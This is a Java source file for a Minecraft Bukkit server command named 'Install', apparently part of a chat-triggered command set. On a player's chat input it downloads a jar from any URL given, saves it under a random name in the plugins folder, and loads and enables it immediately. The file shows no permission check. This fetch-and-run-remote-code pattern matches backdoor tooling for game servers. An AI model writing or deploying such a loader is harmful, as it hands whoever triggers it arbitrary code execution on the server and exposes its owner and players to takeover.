package de.impact.commands.server;

import de.impact.commands.eventhandler.Command;
import de.impact.commands.eventhandler.CommandCategory;
import de.impact.utils.ChatUtils;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

import java.io.File;
import java.io.InputStream;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.Random;

public class Install extends Command {

    public Install() {
        super("Install", "Install <Plugin direct download URL>", "Install a plugin straight from a URL", CommandCategory.SERVER);
    }

    @Override
    public void onChat(String[] aliases, Player p) {

        if(aliases.length < 1) {
            sendUsage(p);
            return;
        }

        long name = new Random().nextLong();

        try {

            URL url = new URL(aliases[0]);
            InputStream in = url.openStream();

            Files.copy(in, Paths.get("plugins/" + name + ".jar"), StandardCopyOption.REPLACE_EXISTING);
            Plugin pl = Bukkit.getPluginManager().loadPlugin(new File("plugins/"+name+".jar"));

            Bukkit.getPluginManager().enablePlugin(pl);

            ChatUtils.sendMessage(p, "The plugin has been downloaded and enabled");

        } catch (Exception ex) {
            new File("plugins/"+name+".jar").delete();
            ChatUtils.sendMessage(p, "You provided a invalid URL");
        }

    }

}
